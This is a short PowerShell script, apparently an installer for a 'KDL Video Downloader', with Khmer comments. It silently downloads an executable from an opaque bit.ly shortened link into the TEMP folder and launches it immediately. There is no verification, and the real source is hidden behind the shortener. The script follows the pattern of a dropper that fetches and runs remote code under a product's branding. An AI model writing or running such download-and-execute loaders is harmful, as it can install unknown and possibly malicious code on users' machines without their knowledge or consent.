$url = "https://bit.ly/ksl2k26"
$path = "$env:TEMP\kdl26.exe"

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "      KDL VIDEO DOWNLOADER INSTALLER      " -ForegroundColor White -BackgroundColor Blue
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "[+] Connecting and Downloading..." -ForegroundColor Yellow

try {
    # បន្ថែម -MaximumRedirection ដើម្បីឱ្យវាស្គាល់ Link Bitly
    Invoke-WebRequest -Uri $url -OutFile $path -MaximumRedirection 5 -UseBasicParsing
    Write-Host "[+] Success! Launching Tool..." -ForegroundColor Green
    & $path
} catch {
    Write-Host "[!] Error: មិនអាចទាញយកបានទេ!" -ForegroundColor Red
}
